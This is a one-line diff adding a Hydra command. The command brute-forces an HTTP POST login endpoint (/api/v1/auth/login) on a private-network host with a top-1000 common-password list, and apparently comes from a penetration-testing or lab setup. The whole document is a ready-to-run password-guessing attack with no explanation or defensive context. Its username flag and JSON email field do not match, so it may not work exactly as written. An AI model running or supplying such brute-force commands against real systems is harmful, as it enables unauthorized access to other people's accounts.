@@ -1,0 +1,1 @@
+hydra -l admin@mail.com -P ~/Desktop/10-million-password-list-top-1000.txt http-post-form "/api/v1/auth/login:{"user_email": "test@mail.com","user_password": "^PASS^"}:F=An Error Occurred" -V -s 80 http://192.168.1.78
